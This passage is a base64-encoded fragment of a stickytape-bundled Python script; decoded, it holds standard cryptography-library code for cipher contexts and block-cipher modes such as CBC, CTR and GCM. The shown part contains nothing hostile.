VsZi5hbGdvcml0aG0sIHNlbGYubW9kZVxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gc2VsZi5fd3JhcF9jdHgoY3R4LCBlbmNyeXB0PUZhbHNlKVxyXG5cclxuICAgIGRlZiBfd3JhcF9jdHgoXHJcbiAgICAgICAgc2VsZiwgY3R4OiAiX0JhY2tlbmRDaXBoZXJDb250ZXh0IiwgZW5jcnlwdDogYm9vbFxyXG4gICAgKSAtPiB0eXBpbmcuVW5pb25bXHJcbiAgICAgICAgQUVBREVuY3J5cHRpb25Db250ZXh0LCBBRUFERGVjcnlwdGlvbkNvbnRleHQsIENpcGhlckNvbnRleHRcclxuICAgIF06XHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZShzZWxmLm1vZGUsIG1vZGVzLk1vZGVXaXRoQXV0aGVudGljYXRpb25UYWcpOlxyXG4gICAgICAgICAgICBpZiBlbmNyeXB0OlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIF9BRUFERW5jcnlwdGlvbkNvbnRleHQoY3R4KVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIF9BRUFERGVjcnlwdGlvbkNvbnRleHQoY3R4KVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldHVybiBfQ2lwaGVyQ29udGV4dChjdHgpXHJcblxyXG5cclxuX0NJUEhFUl9UWVBFID0gQ2lwaGVyW1xyXG4gICAgdHlwaW5nLlVuaW9uW1xyXG4gICAgICAgIG1vZGVzLk1vZGVXaXRoTm9uY2UsXHJcbiAgICAgICAgbW9kZXMuTW9kZVdpdGhUd2VhayxcclxuICAgICAgICBOb25lLFxyXG4gICAgICAgIG1vZGVzLkVDQixcclxuICAgICAgICBtb2Rlcy5Nb2RlV2l0aEluaXRpYWxpemF0aW9uVmVjdG9yLFxyXG4gICAgXVxyXG5dXHJcblxyXG5cclxuY2xhc3MgX0NpcGhlckNvbnRleHQoQ2lwaGVyQ29udGV4dCk6XHJcbiAgICBfY3R4OiB0eXBpbmcuT3B0aW9uYWxbIl9CYWNrZW5kQ2lwaGVyQ29udGV4dCJdXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGN0eDogIl9CYWNrZW5kQ2lwaGVyQ29udGV4dCIpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fY3R4ID0gY3R4XHJcblxyXG4gICAgZGVmIHVwZGF0ZShzZWxmLCBkYXRhOiBieXRlcykgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgc2VsZi5fY3R4IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIEFscmVhZHlGaW5hbGl6ZWQoIkNvbnRleHQgd2FzIGFscmVhZHkgZmluYWxpemVkLiIpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2N0eC51cGRhdGUoZGF0YSlcclxuXHJcbiAgICBkZWYgdXBkYXRlX2ludG8oc2VsZiwgZGF0YTogYnl0ZXMsIGJ1ZjogYnl0ZXMpIC0+IGludDpcclxuICAgICAgICBpZiBzZWxmLl9jdHggaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgQWxyZWFkeUZpbmFsaXplZCgiQ29udGV4dCB3YXMgYWxyZWFkeSBmaW5hbGl6ZWQuIilcclxuICAgICAgICByZXR1cm4gc2VsZi5fY3R4LnVwZGF0ZV9pbnRvKGRhdGEsIGJ1ZilcclxuXHJcbiAgICBkZWYgZmluYWxpemUoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgc2VsZi5fY3R4IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIEFscmVhZHlGaW5hbGl6ZWQoIkNvbnRleHQgd2FzIGFscmVhZHkgZmluYWxpemVkLiIpXHJcbiAgICAgICAgZGF0YSA9IHNlbGYuX2N0eC5maW5hbGl6ZSgpXHJcbiAgICAgICAgc2VsZi5fY3R4ID0gTm9uZVxyXG4gICAgICAgIHJldHVybiBkYXRhXHJcblxyXG5cclxuY2xhc3MgX0FFQURDaXBoZXJDb250ZXh0KEFFQURDaXBoZXJDb250ZXh0KTpcclxuICAgIF9jdHg6IHR5cGluZy5PcHRpb25hbFsiX0JhY2tlbmRDaXBoZXJDb250ZXh0Il1cclxuICAgIF90YWc6IHR5cGluZy5PcHRpb25hbFtieXRlc11cclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY3R4OiAiX0JhY2tlbmRDaXBoZXJDb250ZXh0IikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9jdHggPSBjdHhcclxuICAgICAgICBzZWxmLl9ieXRlc19wcm9jZXNzZWQgPSAwXHJcbiAgICAgICAgc2VsZi5fYWFkX2J5dGVzX3Byb2Nlc3NlZCA9IDBcclxuICAgICAgICBzZWxmLl90YWcgPSBOb25lXHJcbiAgICAgICAgc2VsZi5fdXBkYXRlZCA9IEZhbHNlXHJcblxyXG4gICAgZGVmIF9jaGVja19saW1pdChzZWxmLCBkYXRhX3NpemU6IGludCkgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9jdHggaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgQWxyZWFkeUZpbmFsaXplZCgiQ29udGV4dCB3YXMgYWxyZWFkeSBmaW5hbGl6ZWQuIilcclxuICAgICAgICBzZWxmLl91cGRhdGVkID0gVHJ1ZVxyXG4gICAgICAgIHNlbGYuX2J5dGVzX3Byb2Nlc3NlZCArPSBkYXRhX3NpemVcclxuICAgICAgICBpZiBzZWxmLl9ieXRlc19wcm9jZXNzZWQgPiBzZWxmLl9jdHguX21vZGUuX01BWF9FTkNSWVBURURfQllURVM6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAie30gaGFzIGEgbWF4aW11bSBlbmNyeXB0ZWQgYnl0ZSBsaW1pdCBvZiB7fSIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2N0eC5fbW9kZS5uYW1lLCBzZWxmLl9jdHguX21vZGUuX01BWF9FTkNSWVBURURfQllURVNcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIGRlZiB1cGRhdGUoc2VsZiwgZGF0YTogYnl0ZXMpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHNlbGYuX2NoZWNrX2xpbWl0KGxlbihkYXRhKSlcclxuICAgICAgICAjIG15cHkgbmVlZHMgdGhpcyBhc3NlcnQgZXZlbiB0aG91Z2ggX2NoZWNrX2xpbWl0IGFscmVhZHkgY2hlY2tlZFxyXG4gICAgICAgIGFzc2VydCBzZWxmLl9jdHggaXMgbm90IE5vbmVcclxuICAgICAgICByZXR1cm4gc2VsZi5fY3R4LnVwZGF0ZShkYXRhKVxyXG5cclxuICAgIGRlZiB1cGRhdGVfaW50byhzZWxmLCBkYXRhOiBieXRlcywgYnVmOiBieXRlcykgLT4gaW50OlxyXG4gICAgICAgIHNlbGYuX2NoZWNrX2xpbWl0KGxlbihkYXRhKSlcclxuICAgICAgICAjIG15cHkgbmVlZHMgdGhpcyBhc3NlcnQgZXZlbiB0aG91Z2ggX2NoZWNrX2xpbWl0IGFscmVhZHkgY2hlY2tlZFxyXG4gICAgICAgIGFzc2VydCBzZWxmLl9jdHggaXMgbm90IE5vbmVcclxuICAgICAgICByZXR1cm4gc2VsZi5fY3R4LnVwZGF0ZV9pbnRvKGRhdGEsIGJ1ZilcclxuXHJcbiAgICBkZWYgZmluYWxpemUoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgc2VsZi5fY3R4IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIEFscmVhZHlGaW5hbGl6ZWQoIkNvbnRleHQgd2FzIGFscmVhZHkgZmluYWxpemVkLiIpXHJcbiAgICAgICAgZGF0YSA9IHNlbGYuX2N0eC5maW5hbGl6ZSgpXHJcbiAgICAgICAgc2VsZi5fdGFnID0gc2VsZi5fY3R4LnRhZ1xyXG4gICAgICAgIHNlbGYuX2N0eCA9IE5vbmVcclxuICAgICAgICByZXR1cm4gZGF0YVxyXG5cclxuICAgIGRlZiBhdXRoZW50aWNhdGVfYWRkaXRpb25hbF9kYXRhKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX2N0eCBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBBbHJlYWR5RmluYWxpemVkKCJDb250ZXh0IHdhcyBhbHJlYWR5IGZpbmFsaXplZC4iKVxyXG4gICAgICAgIGlmIHNlbGYuX3VwZGF0ZWQ6XHJcbiAgICAgICAgICAgIHJhaXNlIEFscmVhZHlVcGRhdGVkKCJVcGRhdGUgaGFzIGJlZW4gY2FsbGVkIG9uIHRoaXMgY29udGV4dC4iKVxyXG5cclxuICAgICAgICBzZWxmLl9hYWRfYnl0ZXNfcHJvY2Vzc2VkICs9IGxlbihkYXRhKVxyXG4gICAgICAgIGlmIHNlbGYuX2FhZF9ieXRlc19wcm9jZXNzZWQgPiBzZWxmLl9jdHguX21vZGUuX01BWF9BQURfQllURVM6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAie30gaGFzIGEgbWF4aW11bSBBQUQgYnl0ZSBsaW1pdCBvZiB7fSIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2N0eC5fbW9kZS5uYW1lLCBzZWxmLl9jdHguX21vZGUuX01BWF9BQURfQllURVNcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBzZWxmLl9jdHguYXV0aGVudGljYXRlX2FkZGl0aW9uYWxfZGF0YShkYXRhKVxyXG5cclxuXHJcbmNsYXNzIF9BRUFERGVjcnlwdGlvbkNvbnRleHQoX0FFQURDaXBoZXJDb250ZXh0LCBBRUFERGVjcnlwdGlvbkNvbnRleHQpOlxyXG4gICAgZGVmIGZpbmFsaXplX3dpdGhfdGFnKHNlbGYsIHRhZzogYnl0ZXMpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIHNlbGYuX2N0eCBpcyBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBBbHJlYWR5RmluYWxpemVkKCJDb250ZXh0IHdhcyBhbHJlYWR5IGZpbmFsaXplZC4iKVxyXG4gICAgICAgIGRhdGEgPSBzZWxmLl9jdHguZmluYWxpemVfd2l0aF90YWcodGFnKVxyXG4gICAgICAgIHNlbGYuX3RhZyA9IHNlbGYuX2N0eC50YWdcclxuICAgICAgICBzZWxmLl9jdHggPSBOb25lXHJcbiAgICAgICAgcmV0dXJuIGRhdGFcclxuXHJcblxyXG5jbGFzcyBfQUVBREVuY3J5cHRpb25Db250ZXh0KF9BRUFEQ2lwaGVyQ29udGV4dCwgQUVBREVuY3J5cHRpb25Db250ZXh0KTpcclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHRhZyhzZWxmKSAtPiBieXRlczpcclxuICAgICAgICBpZiBzZWxmLl9jdHggaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIE5vdFlldEZpbmFsaXplZChcclxuICAgICAgICAgICAgICAgICJZb3UgbXVzdCBmaW5hbGl6ZSBlbmNyeXB0aW9uIGJlZm9yZSAiICJnZXR0aW5nIHRoZSB0YWcuIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX3RhZyBpcyBub3QgTm9uZVxyXG4gICAgICAgIHJldHVybiBzZWxmLl90YWdcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvcHJpbWl0aXZlcy9jaXBoZXJzL21vZGVzLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuXHJcbmltcG9ydCBhYmNcclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkgaW1wb3J0IHV0aWxzXHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IFVuc3VwcG9ydGVkQWxnb3JpdGhtLCBfUmVhc29uc1xyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5fY2lwaGVyYWxnb3JpdGhtIGltcG9ydCAoXHJcbiAgICBCbG9ja0NpcGhlckFsZ29yaXRobSxcclxuICAgIENpcGhlckFsZ29yaXRobSxcclxuKVxyXG5cclxuXHJcbmNsYXNzIE1vZGUobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIG5hbWUoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEEgc3RyaW5nIG5hbWluZyB0aGlzIG1vZGUgKGUuZy4gIkVDQiIsICJDQkMiKS5cclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgdmFsaWRhdGVfZm9yX2FsZ29yaXRobShzZWxmLCBhbGdvcml0aG06IENpcGhlckFsZ29yaXRobSkgLT4gTm9uZTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBDaGVja3MgdGhhdCBhbGwgdGhlIG5lY2Vzc2FyeSBpbnZhcmlhbnRzIG9mIHRoaXMgKG1vZGUsIGFsZ29yaXRobSlcclxuICAgICAgICBjb21iaW5hdGlvbiBhcmUgbWV0LlxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbmNsYXNzIE1vZGVXaXRoSW5pdGlhbGl6YXRpb25WZWN0b3IoTW9kZSwgbWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIGluaXRpYWxpemF0aW9uX3ZlY3RvcihzZWxmKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgdmFsdWUgb2YgdGhlIGluaXRpYWxpemF0aW9uIHZlY3RvciBmb3IgdGhpcyBtb2RlIGFzIGJ5dGVzLlxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbmNsYXNzIE1vZGVXaXRoVHdlYWsoTW9kZSwgbWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3Rwcm9wZXJ0eVxyXG4gICAgZGVmIHR3ZWFrKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFRoZSB2YWx1ZSBvZiB0aGUgdHdlYWsgZm9yIHRoaXMgbW9kZSBhcyBieXRlcy5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5jbGFzcyBNb2RlV2l0aE5vbmNlKE1vZGUsIG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBub25jZShzZWxmKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgdmFsdWUgb2YgdGhlIG5vbmNlIGZvciB0aGlzIG1vZGUgYXMgYnl0ZXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuY2xhc3MgTW9kZVdpdGhBdXRoZW50aWNhdGlvblRhZyhNb2RlLCBtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgdGFnKHNlbGYpIC0+IHR5cGluZy5PcHRpb25hbFtieXRlc106XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIHZhbHVlIG9mIHRoZSB0YWcgc3VwcGxpZWQgdG8gdGhlIGNvbnN0cnVjdG9yIG9mIHRoaXMgbW9kZS5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5kZWYgX2NoZWNrX2Flc19rZXlfbGVuZ3RoKHNlbGY6IE1vZGUsIGFsZ29yaXRobTogQ2lwaGVyQWxnb3JpdGhtKSAtPiBOb25lOlxyXG4gICAgaWYgYWxnb3JpdGhtLmtleV9zaXplID4gMjU2IGFuZCBhbGdvcml0aG0ubmFtZSA9PSAiQUVTIjpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAiT25seSAxMjgsIDE5MiwgYW5kIDI1NiBiaXQga2V5cyBhcmUgYWxsb3dlZCBmb3IgdGhpcyBBRVMgbW9kZSJcclxuICAgICAgICApXHJcblxyXG5cclxuZGVmIF9jaGVja19pdl9sZW5ndGgoXHJcbiAgICBzZWxmOiBNb2RlV2l0aEluaXRpYWxpemF0aW9uVmVjdG9yLCBhbGdvcml0aG06IEJsb2NrQ2lwaGVyQWxnb3JpdGhtXHJcbikgLT4gTm9uZTpcclxuICAgIGlmIGxlbihzZWxmLmluaXRpYWxpemF0aW9uX3ZlY3RvcikgKiA4ICE9IGFsZ29yaXRobS5ibG9ja19zaXplOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICJJbnZhbGlkIElWIHNpemUgKHt9KSBmb3Ige30uIi5mb3JtYXQoXHJcbiAgICAgICAgICAgICAgICBsZW4oc2VsZi5pbml0aWFsaXphdGlvbl92ZWN0b3IpLCBzZWxmLm5hbWVcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIClcclxuXHJcblxyXG5kZWYgX2NoZWNrX25vbmNlX2xlbmd0aChcclxuICAgIG5vbmNlOiBieXRlcywgbmFtZTogc3RyLCBhbGdvcml0aG06IENpcGhlckFsZ29yaXRobVxyXG4pIC0+IE5vbmU6XHJcbiAgICBpZiBub3QgaXNpbnN0YW5jZShhbGdvcml0aG0sIEJsb2NrQ2lwaGVyQWxnb3JpdGhtKTpcclxuICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgZiJ7bmFtZX0gcmVxdWlyZXMgYSBibG9jayBjaXBoZXIgYWxnb3JpdGhtIixcclxuICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfQ0lQSEVSLFxyXG4gICAgICAgIClcclxuICAgIGlmIGxlbihub25jZSkgKiA4ICE9IGFsZ29yaXRobS5ibG9ja19zaXplOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICJJbnZhbGlkIG5vbmNlIHNpemUgKHt9KSBmb3Ige30uIi5mb3JtYXQobGVuKG5vbmNlKSwgbmFtZSlcclxuICAgICAgICApXHJcblxyXG5cclxuZGVmIF9jaGVja19pdl9hbmRfa2V5X2xlbmd0aChcclxuICAgIHNlbGY6IE1vZGVXaXRoSW5pdGlhbGl6YXRpb25WZWN0b3IsIGFsZ29yaXRobTogQ2lwaGVyQWxnb3JpdGhtXHJcbikgLT4gTm9uZTpcclxuICAgIGlmIG5vdCBpc2luc3RhbmNlKGFsZ29yaXRobSwgQmxvY2tDaXBoZXJBbGdvcml0aG0pOlxyXG4gICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICBmIntzZWxmfSByZXF1aXJlcyBhIGJsb2NrIGNpcGhlciBhbGdvcml0aG0iLFxyXG4gICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9DSVBIRVIsXHJcbiAgICAgICAgKVxyXG4gICAgX2NoZWNrX2Flc19rZXlfbGVuZ3RoKHNlbGYsIGFsZ29yaXRobSlcclxuICAgIF9jaGVja19pdl9sZW5ndGgoc2VsZiwgYWxnb3JpdGhtKVxyXG5cclxuXHJcbmNsYXNzIENCQyhNb2RlV2l0aEluaXRpYWxpemF0aW9uVmVjdG9yKTpcclxuICAgIG5hbWUgPSAiQ0JDIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBpbml0aWFsaXphdGlvbl92ZWN0b3I6IGJ5dGVzKTpcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXNsaWtlKCJpbml0aWFsaXphdGlvbl92ZWN0b3IiLCBpbml0aWFsaXphdGlvbl92ZWN0b3IpXHJcbiAgICAgICAgc2VsZi5faW5pdGlhbGl6YXRpb25fdmVjdG9yID0gaW5pdGlhbGl6YXRpb25fdmVjdG9yXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgaW5pdGlhbGl6YXRpb25fdmVjdG9yKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9pbml0aWFsaXphdGlvbl92ZWN0b3JcclxuXHJcbiAgICB2YWxpZGF0ZV9mb3JfYWxnb3JpdGhtID0gX2NoZWNrX2l2X2FuZF9rZXlfbGVuZ3RoXHJcblxyXG5cclxuY2xhc3MgWFRTKE1vZGVXaXRoVHdlYWspOlxyXG4gICAgbmFtZSA9ICJYVFMiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHR3ZWFrOiBieXRlcyk6XHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzbGlrZSgidHdlYWsiLCB0d2VhaylcclxuXHJcbiAgICAgICAgaWYgbGVuKHR3ZWFrKSAhPSAxNjpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigidHdlYWsgbXVzdCBiZSAxMjgtYml0cyAoMTYgYnl0ZXMpIilcclxuXHJcbiAgICAgICAgc2VsZi5fdHdlYWsgPSB0d2Vha1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHR3ZWFrKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl90d2Vha1xyXG5cclxuICAgIGRlZiB2YWxpZGF0ZV9mb3JfYWxnb3JpdGhtKHNlbGYsIGFsZ29yaXRobTogQ2lwaGVyQWxnb3JpdGhtKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIGFsZ29yaXRobS5rZXlfc2l6ZSBub3QgaW4gKDI1NiwgNTEyKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJUaGUgWFRTIHNwZWNpZmljYXRpb24gcmVxdWlyZXMgYSAyNTYtYml0IGtleSBmb3IgQUVTLTEyOC1YVFMiXHJcbiAgICAgICAgICAgICAgICAiIGFuZCA1MTItYml0IGtleSBmb3IgQUVTLTI1Ni1YVFMiXHJcbiAgICAgICAgICAgIClcclxuXHJcblxyXG5jbGFzcyBFQ0IoTW9kZSk6XHJcbiAgICBuYW1lID0gIkVDQiJcclxuXHJcbiAgICB2YWxpZGF0ZV9mb3JfYWxnb3JpdGhtID0gX2NoZWNrX2Flc19rZXlfbGVuZ3RoXHJcblxyXG5cclxuY2xhc3MgT0ZCKE1vZGVXaXRoSW5pdGlhbGl6YXRpb25WZWN0b3IpOlxyXG4gICAgbmFtZSA9ICJPRkIiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGluaXRpYWxpemF0aW9uX3ZlY3RvcjogYnl0ZXMpOlxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlc2xpa2UoImluaXRpYWxpemF0aW9uX3ZlY3RvciIsIGluaXRpYWxpemF0aW9uX3ZlY3RvcilcclxuICAgICAgICBzZWxmLl9pbml0aWFsaXphdGlvbl92ZWN0b3IgPSBpbml0aWFsaXphdGlvbl92ZWN0b3JcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBpbml0aWFsaXphdGlvbl92ZWN0b3Ioc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2luaXRpYWxpemF0aW9uX3ZlY3RvclxyXG5cclxuICAgIHZhbGlkYXRlX2Zvcl9hbGdvcml0aG0gPSBfY2hlY2tfaXZfYW5kX2tleV9sZW5ndGhcclxuXHJcblxyXG5jbGFzcyBDRkIoTW9kZVdpdGhJbml0aWFsaXphdGlvblZlY3Rvcik6XHJcbiAgICBuYW1lID0gIkNGQiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgaW5pdGlhbGl6YXRpb25fdmVjdG9yOiBieXRlcyk6XHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzbGlrZSgiaW5pdGlhbGl6YXRpb25fdmVjdG9yIiwgaW5pdGlhbGl6YXRpb25fdmVjdG9yKVxyXG4gICAgICAgIHNlbGYuX2luaXRpYWxpemF0aW9uX3ZlY3RvciA9IGluaXRpYWxpemF0aW9uX3ZlY3RvclxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGluaXRpYWxpemF0aW9uX3ZlY3RvcihzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gc2VsZi5faW5pdGlhbGl6YXRpb25fdmVjdG9yXHJcblxyXG4gICAgdmFsaWRhdGVfZm9yX2FsZ29yaXRobSA9IF9jaGVja19pdl9hbmRfa2V5X2xlbmd0aFxyXG5cclxuXHJcbmNsYXNzIENGQjgoTW9kZVdpdGhJbml0aWFsaXphdGlvblZlY3Rvcik6XHJcbiAgICBuYW1lID0gIkNGQjgiXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGluaXRpYWxpemF0aW9uX3ZlY3RvcjogYnl0ZXMpOlxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlc2xpa2UoImluaXRpYWxpemF0aW9uX3ZlY3RvciIsIGluaXRpYWxpemF0aW9uX3ZlY3RvcilcclxuICAgICAgICBzZWxmLl9pbml0aWFsaXphdGlvbl92ZWN0b3IgPSBpbml0aWFsaXphdGlvbl92ZWN0b3JcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBpbml0aWFsaXphdGlvbl92ZWN0b3Ioc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2luaXRpYWxpemF0aW9uX3ZlY3RvclxyXG5cclxuICAgIHZhbGlkYXRlX2Zvcl9hbGdvcml0aG0gPSBfY2hlY2tfaXZfYW5kX2tleV9sZW5ndGhcclxuXHJcblxyXG5jbGFzcyBDVFIoTW9kZVdpdGhOb25jZSk6XHJcbiAgICBuYW1lID0gIkNUUiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgbm9uY2U6IGJ5dGVzKTpcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXNsaWtlKCJub25jZSIsIG5vbmNlKVxyXG4gICAgICAgIHNlbGYuX25vbmNlID0gbm9uY2VcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBub25jZShzZWxmKSAtPiBieXRlczpcclxuICAgICAgICByZXR1cm4gc2VsZi5fbm9uY2VcclxuXHJcbiAgICBkZWYgdmFsaWRhdGVfZm9yX2FsZ29yaXRobShzZWxmLCBhbGdvcml0aG06IENpcGhlckFsZ29yaXRobSkgLT4gTm9uZTpcclxuICAgICAgICBfY2hlY2tfYWVzX2tleV9sZW5ndGgoc2VsZiwgYWxnb3JpdGhtKVxyXG4gICAgICAgIF9jaGVja19ub25jZV9sZW5ndGgoc2VsZi5ub25jZSwgc2VsZi5uYW1lLCBhbGdvcml0aG0pXHJcblxyXG5cclxuY2xhc3MgR0NNKE1vZGVXaXRoSW5pdGlhbGl6YXRpb25WZWN0b3IsIE1vZGVXaXRoQXV0aGVudGljYXRpb25UYWcpOlxyXG4gICAgbmFtZSA9ICJHQ00iXHJcbiAgICBfTUFYX0VOQ1JZUFRFRF9CWVRFUyA9ICgyKiozOSAtIDI1NikgLy8gOFxyXG4gICAgX01BWF9BQURfQllURVMgPSAoMioqNjQpIC8vIDhcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBpbml0aWFsaXphdGlvbl92ZWN0b3I6IGJ5dGVzLFxyXG4gICAgICAgIHRhZzogdHlwaW5nLk9wdGlvbmFsW2J5dGVzXSA9IE5vbmUsXHJcbiAgICAgICAgbWluX3RhZ19sZW5ndGg6IGludCA9IDE2LFxyXG4gICAgKTpcclxuICAgICAgICAjIE9wZW5TU0wgMy4wLjAgY29uc3RyYWlucyBHQ00gSVZzIHRvIFs2NCwgMTAyNF0gYml0cyBpbmNsdXNpdmVcclxuICAgICAgICAjIFRoaXMgaXMgYSBzYW5lIGxpbWl0IGFueXdheSBzbyB3ZVwnbGwgZW5mb3JjZSBpdCBoZXJlLlxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlc2xpa2UoImluaXRpYWxpemF0aW9uX3ZlY3RvciIsIGluaXRpYWxpemF0aW9uX3ZlY3RvcilcclxuICAgICAgICBpZiBsZW4oaW5pdGlhbGl6YXRpb25fdmVjdG9yKSA8IDggb3IgbGVuKGluaXRpYWxpemF0aW9uX3ZlY3RvcikgPiAxMjg6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiaW5pdGlhbGl6YXRpb25fdmVjdG9yIG11c3QgYmUgYmV0d2V